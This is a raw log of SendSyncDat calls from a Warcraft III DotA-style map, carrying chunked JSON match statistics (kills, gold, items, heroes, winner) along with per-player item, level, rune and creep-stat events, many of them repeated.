	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "Data", "Modexl", 0);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227902030);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895108);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895385);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227895897);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896151);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896394);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895108);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896113);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895385);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895897);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896151);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896394);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896131);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895897);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896151);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896394);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227895897);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896113);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895897);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227901510);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895108);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903286);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227895108);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896113);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895879);
	SendSyncDat("dr.x", "Data", "Hero2", 10);
	SendSyncDat("dr.x", "Data", "Assist8", 2);
	SendSyncDat("dr.x", "Data", "Assist9", 2);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"players\":[{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,", 0);
	SendSyncDat("dr.x", "game_stats", "\"froststone\":0,\"gold\":5,\"hero\":1333027688,\"id\":1,\"items\":[1227895894,1227896132,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\"", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_", 0);
	SendSyncDat("dr.x", "game_stats", "denies\":0,\"creep_kills\":0,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1315074670,\"id\":2,\"items\":[0,0,1227896394,0,0,", 0);
	SendSyncDat("dr.x", "game_stats", "1227896131],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tow", 0);
	SendSyncDat("dr.x", "game_stats", "er_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"", 0);
	SendSyncDat("dr.x", "game_stats", "hero\":1433631084,\"id\":3,\"items\":[1227896394,1227896131,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\"", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0", 0);
	SendSyncDat("dr.x", "game_stats", ",\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":12,\"hero\":1332766568,\"id\":4,\"items\":[1227896131,1227896113,1227896113,1227895879", 0);
	SendSyncDat("dr.x", "game_stats", ",0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kil", 0);
	SendSyncDat("dr.x", "game_stats", "ls\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"hero\":", 0);
	SendSyncDat("dr.x", "game_stats", "1432510828,\"id\":5,\"items\":[0,1227896131,1227896394,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "w_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deat", 0);
	SendSyncDat("dr.x", "game_stats", "hs\":0,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1160786242,\"id\":6,\"items\":[1227901510,1227896131,0,0,0,0],\"kills\":0,\"left_tim", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"cour", 0);
	SendSyncDat("dr.x", "game_stats", "ier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":551,\"hero\":1215128178,\"id\":7,\"items", 0);
	SendSyncDat("dr.x", "game_stats", "\":[0,1227895879,0,0,1227895879,1227903289],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_pre", 0);
	SendSyncDat("dr.x", "game_stats", "sent_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"fireston", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"froststone\":0,\"gold\":48,\"hero\":1311780946,\"id\":8,\"items\":[1227902030,1227895898,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_", 0);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"", 0);
	SendSyncDat("dr.x", "game_stats", "creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":385,\"hero\":1211117643,\"id\":9,\"items\":[1227895375,", 0);
	SendSyncDat("dr.x", "game_stats", "1227896137,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills", 0);
	SendSyncDat("dr.x", "game_stats", "\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"go", 0);
	SendSyncDat("dr.x", "game_stats", "ld\":208,\"hero\":1212365106,\"id\":10,\"items\":[1227896131,1227896132,1227895879,1227895385,1227895879,0],\"kills\":0,\"left_time\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "Data", "GameStart", 1);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "RuneUse6", 5);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "Level2", 5);
	SendSyncDat("dr.x", "Data", "Level2", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "Level2", 2);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896131);
	SendSyncDat("dr.x", "Data", "Level3", 5);
	SendSyncDat("dr.x", "Data", "Level2", 4);
	SendSyncDat("dr.x", "Data", "Level3", 8);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895894);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "Level2", 11);
	SendSyncDat("dr.x", "Data", "Level2", 9);
	SendSyncDat("dr.x", "Data", "Level2", 10);
	SendSyncDat("dr.x", "Data", "Level2", 7);
	SendSyncDat("dr.x", "Data", "Level2", 3);
	SendSyncDat("dr.x", "Data", "Level2", 1);
	SendSyncDat("dr.x", "Data", "Level3", 2);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903796);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903796);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227902265);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227895385);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227900739);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227900994);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227900739);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227900739);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900977);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900977);
	SendSyncDat("dr.x", "Data", "Level4", 5);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900977);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse1", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227902030);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227902028);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Level3", 3);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895898);
	SendSyncDat("dr.x", "Data", "Level3", 1);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227896131);
	SendSyncDat("dr.x", "Data", "Level4", 8);
	SendSyncDat("dr.x", "Data", "Level3", 7);
	SendSyncDat("dr.x", "Data", "Level3", 11);
	SendSyncDat("dr.x", "Data", "Level4", 2);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227902265);
	SendSyncDat("dr.x", "Data", "Level3", 4);
	SendSyncDat("dr.x", "Data", "Level3", 9);
	SendSyncDat("dr.x", "Data", "CSK1", 2);
	SendSyncDat("dr.x", "Data", "CSD1", 2);
	SendSyncDat("dr.x", "Data", "NK1", 0);
	SendSyncDat("dr.x", "Data", "CSK7", 9);
	SendSyncDat("dr.x", "Data", "CSD7", 1);
	SendSyncDat("dr.x", "Data", "NK7", 0);
	SendSyncDat("dr.x", "Data", "CSK2", 11);
	SendSyncDat("dr.x", "Data", "CSD2", 2);
	SendSyncDat("dr.x", "Data", "NK2", 0);
	SendSyncDat("dr.x", "Data", "CSK8", 10);
	SendSyncDat("dr.x", "Data", "CSD8", 1);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 11);
	SendSyncDat("dr.x", "Data", "CSD3", 1);
	SendSyncDat("dr.x", "Data", "NK3", 0);
	SendSyncDat("dr.x", "Data", "CSK9", 3);
	SendSyncDat("dr.x", "Data", "CSD9", 1);
	SendSyncDat("dr.x", "Data", "NK9", 0);
	SendSyncDat("dr.x", "Data", "CSK4", 0);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 12);
	SendSyncDat("dr.x", "Data", "CSK10", 0);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 7);
	SendSyncDat("dr.x", "Data", "CSD5", 3);
	SendSyncDat("dr.x", "Data", "NK5", 0);
	SendSyncDat("dr.x", "Data", "CSK11", 9);
	SendSyncDat("dr.x", "Data", "CSD11", 3);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "Level3", 10);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895893);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895893);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895879);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895375);
	SendSyncDat("dr.x", "Data", "Level5", 5);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "Level5", 8);
	SendSyncDat("dr.x", "Data", "Level5", 2);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227903796);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227903796);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903286);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "Level4", 7);
	SendSyncDat("dr.x", "Data", "RuneUse4", 5);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Hero5", 10);
	SendSyncDat("dr.x", "Data", "Assist8", 5);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "Level4", 3);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227902537);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895863);
	SendSyncDat("dr.x", "Data", "Level4", 9);
	SendSyncDat("dr.x", "Data", "Level4", 1);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896132);
